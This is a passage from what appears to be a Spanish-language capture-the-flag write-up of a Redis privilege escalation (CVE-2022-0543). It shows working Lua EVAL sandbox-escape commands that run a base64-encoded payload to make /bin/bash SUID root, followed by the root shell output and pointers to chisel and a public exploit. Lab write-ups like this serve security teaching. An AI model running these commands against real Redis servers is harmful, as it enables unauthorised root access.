127.0.0.1:6379>  EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("echo ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo= | base64 -d | bash", "r"); local res = f:read("*a"); f:close(); return res' 0
""
```

Por último esperamos unos segundos, volvemos a listar la `bash`, y ya tendremos asignado el permiso **SUID**. Así que lo ejecutamos como el propietario `bash -p`, conseguimos el acceso y la flag:

```console
127.0.0.1:6379>  EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("echo ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo= | base64 -d | bash", "r"); local res = f:read("*a"); f:close(); return res' 0
""
127.0.0.1:6379>  EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -l /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
"-rwsr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\n"
127.0.0.1:6379> exit
dan_smith@shared:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# find / -name root.txt | xargs ls -l
-rw-r----- 1 root     root     33 Aug 16 09:09 /root/root.txt
```

> Existe un exploit para la vulnerabilidad en cuestión **CVE-2022-0543**, el problema es que nos está el modulo `redis` instalado en la máquina. Así que si lo quieres probar puedes user la herramienta `chisel` para redirigir el puerto de `redis`(6379) a tú máquina y con ello explotar la vulnerabilidad con los modulos correctamente instalados

No olvides que al usar el exploit del **CVE** tienes que agregar al objeto redis la contraseña con la parámetro _password_

> Aquí puedes descargar [Chisel](https://github.com/jpillora/chisel) y el exploit [CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)
{: .prompt-info}
